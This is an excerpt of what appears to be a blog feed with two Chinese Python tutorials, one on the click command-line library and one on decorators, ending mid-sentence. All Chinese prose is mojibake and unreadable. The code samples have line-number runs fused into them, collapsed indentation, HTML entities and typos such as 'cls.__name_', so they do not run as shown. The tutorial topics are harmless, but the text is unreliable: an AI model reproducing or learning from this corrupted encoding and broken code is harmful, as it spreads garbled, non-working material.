æ¯”å¦‚ä¸‹é¢å°±æ˜¯ä¸€ä¸ªç»å…¸çš„ä½¿ç”¨å½¢å¼:12345678910111213import click@click.command()@click.option('--count', default=1, help='Number of greetings.')@click.option('--name', prompt='Your name', help='The person to greet.')def hello(count, name): """Simple program that greets NAME for a total of COUNT times.""" for x in range(count): click.echo('Hello %s!' % name)if __name__ == '__main__': hello() ä¸ºäº†æ¼”ç¤ºä»–æ›´å¼ºå¤§çš„åŠŸèƒ½, æˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿä¸€ä¸ªdockerçš„å‘½ä»¤è¡Œã€‚12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@volume.command()def create(): """Create a volume""" pass@volume.command()def inspect(): """isplay detailed information on one or more volumes""" pass@volume.command()@click.option('-f', '--filter', type=str, help="Provide filter values (e.g. 'dangling=true')")@click.option('-q', '--quiet', is_flag=True, help='Only display volume names')@click.option('--format', type=str, help='Pretty-print volumes using a Go template')def ls(filter, quiet, format): """List volumes""" print("%s, %s, %s" % (filter, quiet, format))@volume.command()@click.option('-f', '--force', type=str, help='Force the removal of a running container (uses SIGKILL)')@click.option('-l', '--link', type=str, help='Remove the specified link')@click.option('-v', '--volume', type=str, help='Remove the volumes associated with the container')def rm(force, link, volume): """Remove one or more volumes""" print("%s, %s, %s" % (force, link, volume))@docker.group()def network(): """Manage networks""" pass@network.command()def create(): """Create a network""" pass@network.command()def connect(): """Connect a container to a network""" pass@network.command()def ls(): """List networks""" pass@network.command()def rm(): """Remove one or more networks""" passif __name__ == '__main__': docker() æœ€ç»ˆæ•ˆæœå¦‚ä¸‹:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859âœ test python3 test.pyUsage: test.py [OPTIONS] COMMAND [ARGS]...Options: --help Show this message and exit.Commands: network Manage networks volume Manage volumesâœ test python3 test.py networkUsage: test.py network [OPTIONS] COMMAND [ARGS]... Manage networksOptions: --help Show this message and exit.Commands: connect Connect a container to a network create Create a network ls List networks rm Remove one or more networksâœ test python3 test.py volumeUsage: test.py volume [OPTIONS] COMMAND [ARGS]... Manage volumesOptions: --help Show this message and exit.Commands: create Create a volume inspect isplay detailed information on one or more... ls List volumes rm Remove one or more volumesâœ test python3 test.py volume ls --helpUsage: test.py volume ls [OPTIONS] List volumesOptions: -f, --filter TEXT Provide filter values (e.g. &apos;dangling=true&apos;) -q, --quiet Only display volume names --format TEXT Pretty-print volumes using a Go template --help Show this message and exit.âœ test python3 test.py volume rm --helpUsage: test.py volume rm [OPTIONS] Remove one or more volumesOptions: -f, --force TEXT Force the removal of a running container (uses SIGKILL) -l, --link TEXT Remove the specified link -v, --volume TEXT Remove the volumes associated with the container --help Show this message and exit. å‘½ä»¤ä¸ç»„è¿™æ˜¯clickä¸­æœ€é‡è¦çš„æ¦‚å¿µ, æˆ‘ä»¬å¯ä»¥é€šè¿‡commandå’Œgroupè£…é¥°å™¨å®ç°ä¸€ä¸ªæ— é™åµŒå¥—çš„å‘½ä»¤è¡Œå·¥å…·, å…¶ä¸­commandç”¨æˆ·è£…é¥°å‘½ä»¤, groupç”¨äºå°†å‘½ä»¤åˆ†ç»„(ç±»)ä¸Šé¢é‚£ä¸ªæ¨¡å—dockerå‘½ä»¤è¡Œå°±æ˜¯åˆ†ç»„çš„ä½¿ç”¨ã€‚123456789101112131415161718192021222324import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@docker.group()def network(): """Manage networks""" pass@network.command()def create(): """Create a network""" passif __name__ == '__main__': docker() å‘½ä»¤è¡Œå‚æ•°ä»å‘½ä»¤è¡Œè¯»å–å‚æ•°å€¼ï¼Œå†å°†å…¶ä¼ é€’ç»™å‡½æ•°,è¯»å–çš„å‚æ•°åˆ†ä¸ºä¸¤ç±»: å¯é€‰å‚æ•°å’Œå¿…é¡»å‚æ•°ï¼Œä¸‹é¢åˆ†åˆ«åšä»‹ç» å¯é€‰å‚æ•°ä½¿ç”¨@click.optionè£…é¥°å™¨å®Œæˆå¯é€‰å‚æ•°çš„å½•å…¥, é€šè¿‡ä¸Šé¢çš„æ —å­æˆ‘ä»¬å¯ä»¥å‘ç°è¯¥è£…é¥°å™¨æœ‰å¾ˆå¤šå‚æ•°å‰é¢2ä¸ªä½ç½®å‚æ•°æ¯”å¦‚â€™-fâ€™, â€˜â€“forceâ€™ç”¨äºæè¿°å‚æ•°åç§°, typeæŒ‡æ˜å‚æ•°ç­‰ï¼Œoptionå¸¸ç”¨çš„è®¾ç½®å‚æ•°å¦‚ä¸‹ï¼š default: è®¾ç½®å‘½ä»¤è¡Œå‚æ•°çš„é»˜è®¤å€¼ help: å‚æ•°è¯´æ˜ type: å‚æ•°ç±»å‹ï¼Œå¯ä»¥æ˜¯ string, int, float ç­‰ prompt: å½“åœ¨å‘½ä»¤è¡Œä¸­æ²¡æœ‰è¾“å…¥ç›¸åº”çš„å‚æ•°æ—¶ï¼Œä¼šæ ¹æ® prompt æç¤ºç”¨æˆ·è¾“å…¥ nargs: æŒ‡å®šå‘½ä»¤è¡Œå‚æ•°æ¥æ”¶çš„å€¼çš„ä¸ªæ•°æˆ‘ä»¬å¯ä»¥ä¾ç„¶è¿™äº›é€‰é¡¹æ¥å®Œæˆæˆ‘ä»¬å¾ˆé•¿å¸¸ç”¨çš„åŠŸèƒ½ é»˜è®¤å‚æ•°ç»å¸¸æˆ‘ä»¬éœ€è¦ä¸ºå‚æ•°è®¾ç½®ä¸€äº›é»˜è®¤å€¼, ä½¿ç”¨defaultæŒ‡å®šå‚æ•°çš„é»˜è®¤å€¼å°±èƒ½åŠåˆ°, å°±è¿™ä¹ˆç®€å•12345678910111213141516171819202122232425import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@docker.group()def network(): """Manage networks""" pass@network.command()@click.option('-n', '--name', type=str, default='flat', help='The network name')def create(name): """Create a network""" click.echo('create network %s success' % name)if __name__ == '__main__': docker() è¿è¡Œç»“æœ:123456789101112âœ test python3 test.py network --helpUsage: test.py network [OPTIONS] COMMAND [ARGS]... Manage networksOptions: --help Show this message and exit.Commands: create Create a networkâœ test python3 test.py network createcreate network flat success é€‰æ‹©å‚æ•°å¾ˆå¤šæƒ…å†µä¸‹, æˆ‘ä»¬ä¹Ÿä¼šç»™ç”¨æˆ·ä¸€äº›é€‰æ‹©å‚æ•°, æ¯”å¦‚æ€§åˆ«å°±åªèƒ½é€‰æ‹©(M/F), å› æ­¤æˆ‘ä»¬åº”è¯¥æç¤ºç”¨æˆ·è¾“å…¥æ­£ç¡®çš„å€¼,åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ click.Choice() æ¥é™å®š1234567891011@user.command()@click.option('-g', '--gender', type=click.Choice(['male', 'female']), help="The user's gender")@click.help_option('-h', '--help')def create(gender): """Create a user""" if gender is None: raise click.BadOptionUsage("miss gender choice!") click.echo("user's gender is %s" % gender)if __name__ == '__main__': docker() å¤šå€¼å‚æ•°æœ‰æ—¶ï¼Œä¸€ä¸ªå‚æ•°éœ€è¦æ¥æ”¶å¤šä¸ªå€¼, æ¯”å¦‚æˆ‘ä»¬ç®—ä¸€ä¸ªç«‹æ–¹ä½“çš„ä½“ç§¯, è¿™æ—¶å€™æˆ‘ä»¬å°±éœ€æ±‚é€šè¿‡nargsæŒ‡å®š è¯¥å‚æ•°æ¥æ”¶å¤šå°‘ä¸ªå€¼, æ¯”å¦‚123456789@cube.command()@click.option('-p', '--profile', type=int, nargs=3 ,help="The cube Length, width and height")@click.help_option('-h', '--help')def volume(profile): """Compute cube's volume""" if profile is None: raise click.BadOptionUsage("miss profile!") v = profile[0] * profile[1] * profile[2] click.echo("the cube's volume is %s" % v) å¯†ç å‚æ•°å‘½ä»¤è¡Œæˆ‘ä»¬å¸¸å¸¸æœ‰è¾“å…¥å¯†ç çš„éœ€æ±‚ï¼Œè¿™ä¸ªæˆ‘ä»¬åº”è¯¥æ€ä¹ˆç”¨å–ƒï¼Ÿ123456@user.command()@click.option('-p', '--password', prompt=True, hide_input=True, confirmation_prompt=True)@click.help_option('-h', '--help')def create(password): """Create a user""" click.echo('Encrypting password to %s' % password) è¿™ä¸ªçœ‹ä¸‹æ•ˆæœ:1234âœ test python3 test.py user createPassword:Repeat for confirmation:Encrypting password to 123 å¿…é€‰å‚æ•°ç›¸è¾ƒäºå¯é€‰å‚æ•°çš„çµæ´»æ€§è€Œè¨€, å¿…é¡»å‚æ•°æ¯”è¾ƒç®€å•äº†ã€‚ç”¨@click.argumentæ¥æ·»åŠ å›ºå®šå‚æ•°ã€‚ å®šå‚è¿™é‡Œéœ€è¦ä¸»è¦ä½ç½®å‚æ•°çš„é¡ºåºäº†ã€‚æ¯”å¦‚3ä¸ªå®šå‚æ•° x y z1234567@user.command()@click.argument('x')@click.argument('y')@click.argument('z')def create(x, y, z): """Create a user""" click.echo("%s, %s, %s" % (x, y, z)) 12345678910âœ test python3 test.py user create 1Usage: test.py user create [OPTIONS] X Y ZError: Missing argument "y".âœ test python3 test.py user create 1 2Usage: test.py user create [OPTIONS] X Y ZError: Missing argument "z".âœ test python3 test.py user create 1 2 31, 2, 3 ä¸å®šå‚å‚æ•°ä¸å®šçš„æƒ…å†µä¹Ÿæ˜¯å¸¸æœ‰çš„, æ¯”å¦‚æˆ‘ä»¬æƒ³å°†å¤šä¸ªæ–‡ä»¶ç§»åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œé¢, src: file1 file2 file3 dir: file4ã€‚æˆ‘ä»¬è®©nargs=-1å°±å¯ä»¥äº†, ä»–è¡¨ç¤ºæ¥æ”¶[:-1]çš„å‚æ•°1234567@user.command()@click.argument('src', nargs=-1)@click.argument('dst', nargs=1)def create(src, dst): """Create a user""" click.echo("src: %s" % ' '.join(list(src))) click.echo("dst: %s" % dst) 123âœ test python3 test.py user create file1 file2 file3 file4src: file1 file2 file3dst: file4 å…¶ä»–åŠŸèƒ½clickè¿˜æœ‰æ¯”è¾ƒå¤šçš„é«˜çº§åŠŸèƒ½ï¼Œæ¯”å¦‚åˆ†é¡µå’Œå½©è‰²æ‰“å°, clickæ–‡æ¡£å†™å¾—æ¯”è¾ƒå¥½: clickå®˜æ–¹æ–‡æ¡£ æ€»ç»“pocooéå¸¸çƒ­è¡·äºä½¿ç”¨è£…é¥°å™¨, å¯ä»¥è¯´ä»–ä»¬å¯¹è£…é¥°å™¨çš„ä½¿ç”¨ç®€ç›´å‡ºç¥å…¥åŒ–, åœ¨flaské‡Œé¢å°±å¯è§ä¸€æ–‘, è€Œå‰ä¸€ç¯‡æ‰è®²äº†è£…é¥°å™¨, è¿™ä¸ªclickåº“é‡Œé¢å¯¹è£…é¥°å™¨çš„ä½¿ç”¨ä¹Ÿç§°å¾—ä¸Šå…¸èŒƒ, æºç å¾ˆå€¼å¾—ä¸€è¯»ã€‚]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>click</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonè¿›é˜¶ç³»åˆ—-è£…é¥°å™¨]]></title>
    <url>%2F2017%2F02%2F05%2Fpython-deractor%2F</url>
    <content type="text"><![CDATA[è£…é¥°å™¨æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æ¦‚å¿µï¼Œå¯èƒ½ç®—æ˜¯è¿›é˜¶çš„ä¸€å¤§é—¨æ§›ã€‚è£…é¥°å™¨å…è®¸å‘ä¸€ä¸ªç°æœ‰çš„å¯¹è±¡æ·»åŠ æ–°çš„åŠŸèƒ½ï¼ŒåŒæ—¶åˆä¸æ”¹å˜å…¶ç»“æ„,æ˜¯ä¸€ç§åŠŸèƒ½å¢å¼ºçš„æ¨¡å¼ã€‚åœ¨é¢å‘å¯¹è±¡(OOP)çš„è®¾è®¡æ¨¡å¼ä¸­ï¼Œdecoratorè¢«ç§°ä¸ºè£…é¥°æ¨¡å¼ã€‚OOPçš„è£…é¥°æ¨¡å¼éœ€è¦é€šè¿‡ç»§æ‰¿å’Œç»„åˆæ¥å®ç°ï¼Œè€ŒPythoné™¤äº†èƒ½æ”¯æŒOOPçš„decoratorå¤–ï¼Œç›´æ¥ä»è¯­æ³•å±‚æ¬¡æ”¯æŒdecoratorã€‚Pythonçš„decoratorå¯ä»¥ç”¨å‡½æ•°å®ç°ï¼Œä¹Ÿå¯ä»¥ç”¨ç±»å®ç°ã€‚æ¥ä¸‹æ¥å°†å…¨é¢ä»‹ç»å…³äºPythonè£…é¥°å™¨ç›¸å…³çš„çŸ¥è¯†ã€‚ ç®€ä»‹è£…é¥°å™¨æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªPythonå‡½æ•°ï¼Œå®ƒå¯ä»¥è®©å…¶ä»–å‡½æ•°åœ¨ä¸éœ€è¦åšä»»ä½•ä»£ç å˜åŠ¨çš„å‰æä¸‹å¢åŠ é¢å¤–åŠŸèƒ½ï¼Œè£…é¥°å™¨çš„è¿”å›å€¼ä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°å¯¹è±¡ã€‚å®ƒç»å¸¸ç”¨äºæœ‰åˆ‡é¢éœ€æ±‚çš„åœºæ™¯ï¼Œæ¯”å¦‚ï¼šæ’å…¥æ—¥å¿—ã€æ€§èƒ½æµ‹è¯•ã€äº‹åŠ¡å¤„ç†ã€ç¼“å­˜ã€æƒé™æ ¡éªŒç­‰åœºæ™¯ã€‚è£…é¥°å™¨æ˜¯è§£å†³è¿™ç±»é—®é¢˜çš„ç»ä½³è®¾è®¡ï¼Œæœ‰äº†è£…é¥°å™¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠ½ç¦»å‡ºå¤§é‡ä¸å‡½æ•°åŠŸèƒ½æœ¬èº«æ— å…³çš„é›·åŒä»£ç å¹¶ç»§ç»­é‡ç”¨ã€‚æ¦‚æ‹¬çš„è®²ï¼Œè£…é¥°å™¨çš„ä½œç”¨å°±æ˜¯ä¸ºå·²ç»å­˜åœ¨çš„å‡½æ•°æˆ–å¯¹è±¡æ·»åŠ é¢å¤–çš„åŠŸèƒ½ã€‚ å¼•å­åœ¨Pythoné‡Œï¼Œä¸€åˆ‡çš†å¯¹è±¡, å‡½æ•°æ›´æ˜¯å¤´ç­‰å¯¹è±¡ï¼Œå‡½æ•°å¯¹è±¡å¯ä»¥è¢«èµ‹å€¼ç»™å˜é‡ï¼Œæ‰€ä»¥ï¼Œé€šè¿‡å˜é‡ä¹Ÿèƒ½è°ƒç”¨è¯¥å‡½æ•°12345678&gt;&gt;&gt; def now():... print('2017-02-02')...&gt;&gt;&gt; f = now&gt;&gt;&gt; f()2017-02-02&gt;&gt;&gt; f.__name__'now' ç°åœ¨ï¼Œå‡è®¾æˆ‘ä»¬è¦å¢å¼ºnow()å‡½æ•°çš„åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼Œåœ¨å‡½æ•°è°ƒç”¨å‰åè‡ªåŠ¨æ‰“å°æ—¥å¿—ï¼Œä½†åˆä¸å¸Œæœ›ä¿®æ”¹now()å‡½æ•°çš„å®šä¹‰,è¯¥æ€ä¹ˆåšå–ƒï¼Ÿæœ€ç®€å•çš„æ–¹å¼å°±æ˜¯åŠ¨æ€æ›¿æ¢nowï¼Œå¹¶ä¿æŒå‡½æ•°ç­¾åä¸å˜123456789101112131415def now(): print('2017-02-02')def debug(func): def wrapper(): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func() wrapper.__name__ = func.__name__ return wrappernow = debug(now)now() ä¸ºäº†æ–¹ä¾¿pythonåœ¨è¯­æ³•å±‚é¢å°±å·²ç»æ”¯æŒäº†è£…é¥°å™¨(python &gt; 2.4),@è¯­æ³•ç³–å®é™…ä¸Šå°±ç­‰äºnow = debug(now), å› æ­¤å®é™…ä¸Šåº”è¯¥è¿™æ ·å†™1234567891011121314def debug(func): def wrapper(): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func() wrapper.__name__ = func.__name__ return wrapper@debugdef now(): print('2017-02-02')now() è¿™ä¸ªdubugè£…é¥°å™¨æœ‰ä¸ªå·¨å¤§çš„ç¼ºé™·: æˆ‘ä»¬åªèƒ½è£…é¥°ä¸å¸¦å‚æ•°çš„å‡½æ•°ã€‚å®é™…ä¸Šå‡½æ•°çš„å½¢å¼å„ç§å„æ ·ï¼Œå¦‚ä½•æ‰èƒ½ä¸€ä¸ªè£…é¥°å™¨é€‚é…å„ç§å‡½æ•°å–ƒï¼Ÿpythonæä¾›çš„å¯å˜å‚æ•°å¯ä»¥å¾ˆå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜ã€‚12345678910111213141516171819def debug(func): def wrapper(*args, **kwargs): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func(*args, **kwargs) wrapper.__name__ = func.__name__ return wrapper@debugdef now(): print('2017-02-02')@debugdef hello(name): print("hello %s" % name)now()hello("Bob") å¦‚æ­¤ä¸€ä¸ªåŸºç¡€çš„è£…é¥°å™¨å°±å†™å®Œäº†ï¼Œä»¥ä¸‹å°†ä»‹ç»å„å¼å„æ ·çš„è£…é¥°å™¨ã€‚ å‡½æ•°å¼è£…é¥°å™¨è£…é¥°å™¨æœ¬èº«æ˜¯ä¸€ä¸ªå‡½æ•° è£…é¥°å‡½æ•°è¢«è£…é¥°çš„å¯¹è±¡æ˜¯ä¸€ä¸ªå‡½æ•°, wrapperæ˜¯å¯¹å‡½æ•°çš„å¢å¼º åŸºç¡€-è£…é¥°å™¨æ— å‚æ•°è¿™æ˜¯æœ€åŸºç¡€çš„ä¸€ç§è£…é¥°å™¨, åœ¨å¼•å­ä¸­å·²ç»æœ‰æ —å­äº†ã€‚ é«˜çº§-è£…é¥°å™¨æœ‰å‚æ•°å¸¦å‚æ•°çš„è£…é¥°å™¨å’Œç±»è£…é¥°å™¨å±äºè¿›é˜¶çš„å†…å®¹ã€‚åœ¨ç†è§£è¿™äº›è£…é¥°å™¨ä¹‹å‰ï¼Œæœ€å¥½å¯¹å‡½æ•°çš„é—­åŒ…å’Œè£…é¥°å™¨çš„æ¥å£çº¦å®šæœ‰ä¸€å®šäº†è§£ã€‚å…³äºpythonä¸­çš„é—­åŒ…æ¦‚å¿µæˆ‘åœ¨ä¸‹ä¸€ç¯‡ä¸­ä¼šå•ç‹¬ä»‹ç»,è¿™é‡Œä½ åªéœ€è¦çŸ¥é“é—­åŒ…æ˜¯ä¸€ä¸ªæºå¸¦çŠ¶æ€çš„å‡½æ•°å³å¯ã€‚å®é™…ä¸Šå°±æ˜¯è¿”å›è£…é¥°å™¨çš„ä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯è¿™ä¸ªè£…é¥°å™¨æºå¸¦å¤–éƒ¨å˜é‡(è¿™å°±æ˜¯é—­åŒ…)12345678910111213141516171819def debug(level='INFO'): def decorator(func): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125;()".format(level, func.__name__)) return func(*args, **kwargs) wrapper.__name__ = func.__name__ return wrapper return decorator@debug()def now(): print('2017-02-02')@debug("DEBUG")def hello(name): print("hello %s" % name)now()hello("Bob") è£…é¥°ç±»è¢«è£…é¥°çš„å¯¹è±¡æ˜¯ä¸€ä¸ªç±»,wrapperæ˜¯å¯¹ç±»çš„å¢å¼º,æ‰€ä»¥è£…é¥°å™¨çš„å˜åŒ–å¹¶ä¸å¤§,ç”šè‡³å¯ä»¥æ²¿ç”¨ åŸºç¡€-è£…é¥°å™¨æ— å‚æ•°123456789101112131415161718def debug(cls): def wrapper(*args, **kwargs): print("[DEBUG]: enter &#123;&#125; class".format(cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name_ return wrapper@debugclass Hello(object): def __init__(self, value): self.value = value@debugdef hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") é«˜çº§-è£…é¥°å™¨æœ‰å‚æ•°1234567891011121314151617181920212223def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decorator@debug()class Hello(object): def __init__(self, value): self.value = value@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") ç±»å¼è£…é¥°å™¨è£…é¥°å™¨å‡½æ•°å…¶å®æ˜¯è¿™æ ·ä¸€ä¸ªæ¥å£çº¦æŸï¼Œå®ƒå¿…é¡»æ¥å—ä¸€ä¸ªcallableå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œç„¶åè¿”å›ä¸€ä¸ªcallableå¯¹è±¡ã€‚åœ¨Pythonä¸­ä¸€èˆ¬callableå¯¹è±¡éƒ½æ˜¯å‡½æ•°ï¼Œä½†ä¹Ÿæœ‰ä¾‹å¤–ã€‚åªè¦æŸä¸ªå¯¹è±¡é‡è½½äº† call () æ–¹æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡å°±æ˜¯callableçš„ã€‚æˆ‘ä»¬å¯ä»¥è®©ç±»çš„æ„é€ å‡½æ•° init () æ¥å—ä¸€ä¸ªå‡½æ•°ï¼Œç„¶åé‡è½½ call () å¹¶è¿”å›ä¸€ä¸ªå‡½æ•°ï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°è£…é¥°å™¨å‡½æ•°çš„æ•ˆæœã€‚ è£…é¥°å‡½æ•°å’Œç±»è¢«è£…é¥°çš„å¯¹è±¡æ˜¯ä¸€ä¸ªå‡½æ•°æˆ–æ˜¯ä¸€ä¸ªç±»ï¼Œå…¶å®å¹¶æ²¡æœ‰æœ¬è´¨ä¸Šçš„å·®åˆ«ï¼Œå› æ­¤è¿™é‡Œåˆå¹¶ç»™å‡ºæ —å­ è£…é¥°å™¨æ— å‚æ•°1234567891011121314151617181920class debug(object): def __init__(self, func): self.func = func def __call__(self, *args, **kwargs): print("[DEBUG]: enter function &#123;func&#125;()".format(func=self.func.__name__)) return self.func(*args, **kwargs)@debugclass Hello(object): def __init__(self, value): self.value = value@debugdef hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") è£…é¥°å™¨æœ‰å‚æ•°1234567891011121314151617181920212223class debug(object): def __init__(self, level='INFO'): self._level = level def __call__(self, func): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter function &#123;&#125;()".format(self._level ,func.__name__)) return func(*args, **kwargs) return wrapper@debug()class Hello(object): def __init__(self, name): self.name = name@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") å†…ç½®è£…é¥°å™¨å†…ç½®çš„è£…é¥°å™¨å’Œæ™®é€šçš„è£…é¥°å™¨åŸç†æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡è¿”å›çš„ä¸æ˜¯å‡½æ•°ï¼Œè€Œæ˜¯ç±»å¯¹è±¡ï¼Œæ‰€ä»¥æ›´éš¾ç†è§£ä¸€äº› propertæˆ‘ä»¬å…ˆçœ‹çœ‹propertyåˆ°åº•æ˜¯å•¥,ä»¥ä¸‹æ˜¯propertyç±»çš„doc string123456789101112131415161718192021222324252627282930313233class property(object): """ property(fget=None, fset=None, fdel=None, doc=None) -&gt; property attribute fget is a function to be used for getting an attribute value, and likewise fset is a function for setting, and fdel a function for del'ing, an attribute. Typical use is to define a managed attribute x: class C(object): def getx(self): return self._x def setx(self, value): self._x = value def delx(self): del self._x x = property(getx, setx, delx, "I'm the 'x' property.") Decorators make defining new properties or modifying existing ones easy: class C(object): @property def x(self): "I am the 'x' property." return self._x @x.setter def x(self, value): self._x = value @x.deleter def x(self): del self._x """ def __init__(self, fget=None, fset=None, fdel=None, doc=None): # known special case of property.__init__ pass ... å®é™…ä¸Špropertyè£…é¥°å™¨å¸®æˆ‘ä»¬å®Œæˆäº†x = property(getx, setx, delx, &quot;I&#39;m the &#39;x&#39; property.&quot;)è¿™ä¸ªåŠ¨ä½œï¼Œè€Œä¸”è¿”å›çš„æ˜¯ä¸€ä¸ªpropertyå¯¹è±¡ã€‚ staticmethodstaticmethodä¼ å…¥ä¸€ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªstaticmethodçš„å¯¹è±¡ã€‚123456789101112131415161718192021222324class staticmethod(object): """ staticmethod(function) -&gt; method Convert a function to be a static method. A static method does not receive an implicit first argument. To declare a static method, use this idiom: class C: def f(arg1, arg2, ...): ... f = staticmethod(f) It can be called either on the class (e.g. C.f()) or on an instance (e.g. C().f()). The instance is ignored except for its class. Static methods in Python are similar to those found in Java or C++. For a more advanced concept, see the classmethod builtin. """ def __init__(self, function): # real signature unknown; restored from __doc__ pass ... classmethodåŒç†classmethodä¼ å…¥ä¸€ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªclassmethodå¯¹è±¡ã€‚123456789101112131415161718192021222324252627class classmethod(object): """ classmethod(function) -&gt; method Convert a function to be a class method. A class method receives the class as implicit first argument, just like an instance method receives the instance. To declare a class method, use this idiom: class C: def f(cls, arg1, arg2, ...): ... f = classmethod(f) It can be called either on the class (e.g. C.f()) or on an instance (e.g. C().f()). The instance is ignored except for its class. If a class method is called for a derived class, the derived class object is passed as the implied first argument. Class methods are different than C++ or Java static methods. If you want those, see the staticmethod builtin. """ def __init__(self, function): # real signature unknown; restored from __doc__ pass ... éœ€è¦æ³¨æ„çš„é—®é¢˜è£…é¥°å™¨å¯ä»¥è®©ä½ ä»£ç æ›´åŠ ä¼˜é›…ï¼Œå‡å°‘é‡å¤ï¼Œä½†ä¹Ÿä¸å…¨æ˜¯ä¼˜ç‚¹ï¼Œä¹Ÿä¼šå¸¦æ¥ä¸€äº›é—®é¢˜ã€‚ ä½ç½®é”™è¯¯1234567891011121314151617181920212223def html_tags(tag_name): print('begin outer function.') def wrapper(func): print("begin of inner wrapper function.") def wrapper(*args, **kwargs): content = func(*args, **kwargs) print("&lt;&#123;tag&#125;&gt;&#123;content&#125;&lt;/&#123;tag&#125;&gt;".format(tag=tag_name, content=content)) print('end of inner wrapper function.') return wrapper print('end of outer function') return wrapper@html_tags('b')def hello(name='Toby'): return 'Hello &#123;&#125;!'.format(name)hello()hello() åœ¨è£…é¥°å™¨ä¸­æˆ‘åœ¨å„ä¸ªå¯èƒ½çš„ä½ç½®éƒ½åŠ ä¸Šäº† print è¯­å¥ï¼Œç”¨äºè®°å½•è¢«è°ƒç”¨çš„æƒ…å†µã€‚ä½ çŸ¥é“ä»–ä»¬æœ€åæ‰“å°å‡ºæ¥çš„é¡ºåºå—ï¼Ÿå¦‚æœä½ å¿ƒé‡Œæ²¡åº•ï¼Œé‚£ä¹ˆæœ€å¥½ä¸è¦åœ¨è£…é¥°å™¨å‡½æ•°ä¹‹å¤–æ·»åŠ é€»è¾‘åŠŸèƒ½ï¼Œå¦åˆ™è¿™ä¸ªè£…é¥°å™¨å°±ä¸å—ä½ æ§åˆ¶äº†1234567begin outer function.end of outer functionbegin of inner wrapper function.&lt;b&gt;Hello Toby!&lt;/b&gt;end of inner wrapper function.&lt;b&gt;Hello Toby!&lt;/b&gt;end of inner wrapper function. å‡½æ•°ç­¾åå’Œæ–‡æ¡£ä½¿ç”¨è£…é¥°å™¨åå®é™…ä¸Šå‡½æ•°çš„å‰é¢å’Œæ–‡æ¡£éƒ½ä¼šè¢«æ›¿æ¢æˆwrapperçš„ï¼Œè™½ç„¶æˆ‘ä»¬å¯ä»¥ç®€å•å¤„ç†è¿‡æ¥,ä½†æ˜¯è¿™å¹¶ä¸æ˜¯å®Œç¾çš„è§£å†³ä¹‹é“123456789101112131415161718192021222324252627282930import inspectdef debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decorator@debug()class Hello(object): def __init__(self, value): self.value = value@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob")print(Hello.__name__)print(hello.__name__)print(inspect.getsource(Hello))print(inspect.getsource(hello)) staticmethodå’Œclassmethodä¸èƒ½å†æ¬¡è£…é¥°å½“ä½ æƒ³æŠŠè£…é¥°å™¨ç”¨åœ¨ä¸€ä¸ªé™æ€æ–¹æ³•æˆ–è€…ç±»æ–¹æ³•æ—¶ï¼Œä¸å¥½æ„æ€ï¼ŒæŠ¥é”™äº†ã€‚12345678910111213141516171819202122232425262728293031def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decoratorclass Car(object): def __init__(self, model): self.model = model @debug # è£…é¥°å®ä¾‹æ–¹æ³•ï¼ŒOK def run(self): print("&#123;&#125; is running!".format(self.model)) @debug # è£…é¥°é™æ€æ–¹æ³•ï¼ŒFailed @staticmethod def check_model_for(obj): if isinstance(obj, Car): print("The model of your car is &#123;&#125;".format(obj.model)) else: print("&#123;&#125; is not a car!".format(obj))car = Car('six')car.check_model_for(car) å‰é¢å·²ç»è§£é‡Šäº†@staticmethodè¿™ä¸ªè£…é¥°å™¨ï¼Œå…¶å®å®ƒè¿”å›çš„å¹¶ä¸æ˜¯ä¸€ä¸ªcallableå¯¹è±¡ï¼Œè€Œæ˜¯ä¸€ä¸ªstaticmethodå¯¹è±¡ï¼Œé‚£ä¹ˆå®ƒæ˜¯ä¸ç¬¦åˆè£…é¥°å™¨è¦æ±‚çš„ï¼ˆæ¯”å¦‚ä¼ å…¥ä¸€ä¸ªcallableå¯¹è±¡ï¼‰ï¼Œä½ 